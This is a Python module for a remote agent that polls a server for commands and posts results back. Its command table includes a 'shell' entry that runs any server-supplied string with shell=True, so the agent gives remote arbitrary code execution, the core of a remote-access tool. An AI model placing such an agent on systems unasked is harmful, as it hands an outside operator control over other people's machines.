# commands.py
import subprocess
import platform
import requests
import os
from logger import log
from config import SERVER_URL
from systeminfo import send_system_info

import sys
# ─── Shell Execution ──────────────────────────────────
def _run_shell(command: str) -> str:
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=15
        )
        return result.stdout or result.stderr
    except subprocess.TimeoutExpired:
        return "ERROR: Command timed out"
    except Exception as e:
        return f"ERROR: {e}"

def _disconnect(_):
    log("Disconnect command received — shutting down", "WARNING")
    sys.exit(0)
# ─── Supported Commands ───────────────────────────────
# sysinfo needs session — handled separately in router
ALLOWED_COMMANDS = {
    "ping":     lambda _: "pong",
    "hostname": lambda _: platform.node(),
    "os":       lambda _: f"{platform.system()} {platform.version()}",
    "shell":    _run_shell,
    "disconnect": _disconnect,
}


# ─── Command Router ───────────────────────────────────
def handle_command(data: dict, session: dict):
    command = data.get("command", "").strip()
    args    = data.get("args", "")
    cmd_id  = data.get("cmd_id")

    log(f"Command received: {command}")

    # ── Disconnect — pehle result bhejo phir exit ──
    if command == "disconnect":
        try:
            requests.post(
                f"{SERVER_URL}/api/command/result",
                json={
                    "client_id": session["client_id"],
                    "cmd_id":    cmd_id,
                    "command":   command,
                    "result":    "Agent disconnecting..."
                },
                timeout=5
            )
        except Exception:
            pass
        log("Disconnecting — bye!", "WARNING")
        os._exit(0)

    # sysinfo handled separately — needs session
    if command == "sysinfo":
        result = send_system_info(session) or "System info sent"

    elif command not in ALLOWED_COMMANDS:
        result = f"Unsupported command: {command}"
        log(result, "WARNING")

    else:
        result = ALLOWED_COMMANDS[command](args)

    log(f"Command result: {result}")

    try:
        requests.post(
            f"{SERVER_URL}/api/command/result",
            json={
                "client_id": session["client_id"],
                "cmd_id":    cmd_id,
                "command":   command,
                "result":    result
            },
            timeout=5
        )
    except Exception as e:
        log(f"Failed to send command result: {e}", "ERROR")